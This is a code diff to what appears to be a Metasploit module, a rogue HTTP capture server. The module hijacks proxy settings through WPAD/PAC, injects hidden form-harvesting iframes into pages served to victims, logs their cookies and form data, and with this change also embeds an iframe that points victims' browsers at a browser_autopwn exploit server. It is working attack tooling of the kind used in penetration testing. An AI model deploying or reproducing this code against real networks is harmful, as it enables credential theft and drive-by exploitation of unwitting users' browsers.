@@ -55,7 +55,10 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 				OptPath.new('FORMSDIR',   [ false, "The directory containing form snippets (example.com.txt)", 
 						File.join(Msf::Config.install_root, "data", "exploits", "capture", "http", "forms")
 					]
-				),				
+				),
+				OptAddress.new('AUTOPWN_HOST',[ false, "The IP address of the browser_autopwn service ", nil ]),
+				OptPort.new('AUTOPWN_PORT',[ false, "The SRVPORT port of the browser_autopwn service ", nil ]),
+				OptString.new('AUTOPWN_URI',[ false, "The URIPATH of the browser_autopwn service ", nil ]),
 			], self.class)
 	end
 
@@ -65,7 +68,16 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 		@sitelist = datastore['SITELIST']
 		@myhost   = datastore['SRVHOST']
 		@myport   = datastore['SRVPORT']
-		Thread.current.priority = 20
+		
+		@myautopwn_host =  datastore['AUTOPWN_HOST']
+		@myautopwn_port =  datastore['AUTOPWN_PORT']
+		@myautopwn_uri  =  datastore['AUTOPWN_URI']
+		@myautopwn      = false
+		
+		if(@myautopwn_host and @myautopwn_port and @myautopwn_uri)
+			@myautopwn = true
+		end
+		
 		exploit()
 	end
 	
@@ -146,6 +158,11 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 		
 		mysrc = Rex::Socket.source_address(cli.peerhost)
 		hhead = (req['Host'] || @myhost).split(':', 2)[0]
+		
+		if (req.resource =~ /^http\:\/+([^\/]+)(\/*.*)/)
+			req.resource = $2
+			hhead = $1
+		end
 
 
 		cookies = req['Cookie'] || ''
@@ -176,20 +193,6 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 		end
 		
 		
-		if(req.resource =~ /\.eml$/) 
-				eml = "To: User\r\nFrom: Support\r\nSubject: Failed to connect\r\n\r\nInternet access has been prohibited by the administrator\r\n"
-				res = 
-				"HTTP/1.1 200 OK\r\n" +
-				"Host: #{hhead}\r\n" +
-				"Content-Type: message/rfc822\r\n" +
-				"Content-Length: #{eml.length}\r\n" +
-				"Connection: Close\r\n\r\n#{eml}"
-			print_status("HTTP EML sent to #{cli.peerhost}")
-			cli.put(res)
-			return	
-			
-		end
-		
 		if(req.resource =~ /^\/*wpad.dat|.*\.pac$/i) 
 			prx = "function FindProxyForURL(url, host) { return 'PROXY #{mysrc}:#{@myport}'; }"
 			res = 
@@ -204,7 +207,7 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 		end
 	
 	
-		if(req.resource =~ /^\/*formrec\/(.*)/i) 		
+		if(req.resource =~ /\/+formrec\/(.*)/i) 		
 			data = Rex::Text.uri_decode($1).split("\x00").join(", ")
 
 			report_note(
@@ -233,7 +236,7 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 					
 		print_status("HTTP REQUEST #{cli.peerhost} > #{hhead}:#{@myport} #{req.method} #{req.resource} #{os_name} #{ua_name} #{ua_vers} cookies=#{cookies}")
 				
-		if(req.resource =~ /^\/*forms.html$/)
+		if(req.resource =~ /\/+forms.html$/)
 			frm = inject_forms(hhead)
 			res = 
 				"HTTP/1.1 200 OK\r\n" +
@@ -253,7 +256,7 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 		
 		
 		# Microsoft 'Network Connectivity Status Indicator' Vista
-		if (req['Host'] == 'www.msftncsi.com:80')
+		if (req['Host'] == 'www.msftncsi.com')
 			print_status("HTTP #{cli.peerhost} requested the Network Connectivity Status Indicator page (Vista)")
 			data = "Microsoft NCSI"
 			res  = 
@@ -268,9 +271,23 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 			return			
 		end
 
+		# Microsoft ActiveX Download
+		if (req['Host'] == 'activex.microsoft.com')
+			print_status("HTTP #{cli.peerhost} attempted to download an ActiveX control")
+			data = ""
+			res  = 
+				"HTTP/1.1 404 Not Found\r\n" +
+				"Host: #{mysrc}\r\n" +
+				"Content-Type: application/octet-stream\r\n" +
+				"Content-Length: #{data.length}\r\n" +
+				"Connection: Close\r\n\r\n#{data}"
+			cli.put(res)
+			return			
+		end
+		
 
 		# Sonic.com's Update Service
-		if (req['Host'] == 'updateservice.sonic.com:80')
+		if (req['Host'] == 'updateservice.sonic.com')
 			print_status("HTTP #{cli.peerhost} is running a Sonic.com product that checks for online updates")
 		end		
 		
@@ -325,16 +342,17 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 		
 		buff = ''
 
+
+		if(@myautopwn)
+			buff << "<iframe src='http://#{@myautopwn_host}:#{@myautopwn_port}#{@myautopwn_uri}'></iframe>"
+		end
+		
 		list = File.readlines(@sitelist)
 		list.each do |site|
 			next if site =~ /^#/
 			site.strip!
 			next if site.length == 0
-			buff << "<iframe src='http://www.#{site}:#{@myport}/forms.html'></iframe>"
-		end
-
-		if(ua_name == "IE")
-			buff << "<img src='\\\\\\\\#{mysrc}\\\\public#{Time.now.to_i.to_s}\\\\loading.jpg' width='1' height='1'>"
+			buff << "<iframe src='http://#{site}:#{@myport}/forms.html'></iframe>"
 		end
 		
 		data = File.read(@template)
